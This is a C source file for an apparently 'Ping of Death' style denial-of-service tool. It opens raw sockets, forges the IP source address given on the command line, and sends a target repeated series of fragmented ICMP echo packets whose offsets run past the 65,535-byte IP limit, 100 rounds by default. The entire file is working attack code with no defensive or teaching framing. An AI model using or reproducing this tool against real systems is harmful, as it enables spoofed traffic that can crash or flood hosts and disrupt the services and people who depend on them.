/* Standard I/O and C libraries */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Must add this library to avoid implicit declarations of file descriptor methods */
#include <unistd.h>

/* Sockets libraries */
#include <sys/types.h>
#include <sys/socket.h>

/* Network interface libraries */
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

int main(int argc, char **argv)
{
    int i, s, offset, on;
    char buf[400];
    struct ip *ip = (struct ip *)buf;
    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
    struct hostent *hp, *hp2; /* Host entities/entry points */
    struct sockaddr_in destination;
    int num = 100;

    if (argc < 3)
    {
        printf("\nUsage: %s <source_address> <destination_address> [#_of_packets]\n", argv[0]);
        printf(" - #_of_packets is the number of packets to be sent, 100 is the default value\n");
        exit(1);
    }

    if (argc == 4)
    {
        num = atoi(argv[3]);
    }

    for(i=1; i<=num; i++)
    {
        on = 1;
        bzero(buf, sizeof(buf));
        /* Kill the process if there's an error while trying to create a raw socket */

        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        {
            perror("socket() error");
            exit(1);
        }

        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
        {
            perror("setsockopt() for IP_HDRINCL error");
            exit(1);
        }

        if((hp = gethostbyname(argv[2])) == NULL)
        {
            if((ip->ip_dst.s_addr = inet_addr(argv[2])) == -1)
            {
                fprintf(stderr, "%s: Unable to resolve unknown host.\n", argv[2] );
                exit(1);
            }
        }

        else
            bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);

        if((hp2 = gethostbyname(argv[1])) == NULL)
        {
            if((ip->ip_src.s_addr = inet_addr(argv[1])) == -1)
            {
                fprintf(stderr, "%s: Unable to resolve address. Unknown host.\n", argv[1]);
                exit(1);
            }
        }
        else
            bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);

        printf("Sending to %s from spoofed %s\n", inet_ntoa(ip->ip_dst), argv[1]);

        /* Setting the IPv4 structure */
        ip->ip_v = 4;
        ip->ip_hl = sizeof*ip >> 2;
        ip->ip_tos = 0;
        ip->ip_len = htons(sizeof(buf));
        ip->ip_id = htons(4321);
        ip->ip_off = htons(0);
        ip->ip_ttl = 255;
        ip->ip_p = 1;
        ip->ip_sum = 0;

        destination.sin_addr = ip->ip_dst;
        destination.sin_family = AF_INET;

        icmp->type = ICMP_ECHO;
        icmp->code = 0;

        /* ICMP header checksum */
        icmp->checksum = htons(~(ICMP_ECHO << 8));

        for(offset = 0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip)))
        {
            ip->ip_off = htons(offset >> 3);
            if(offset < 65120)
            {
                ip->ip_off |= htons(0x2000);
            }
            else
            {
                ip->ip_len = htons(418);
            }

            if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&destination, sizeof(destination)) < 0)
            {
                fprintf(stderr, "offset %d: ", offset);
                perror("sendto() error");
            }
            else
            {
                /* printf("sendto() is OK.\n"); */
            }

            if(offset == 0)
            {
                icmp->type = 0;
                icmp->code = 0;
                icmp->checksum = 0;
            }
        }
        /* Close socket */
        close(s);
        usleep(30000);
    }
    return 0;
}
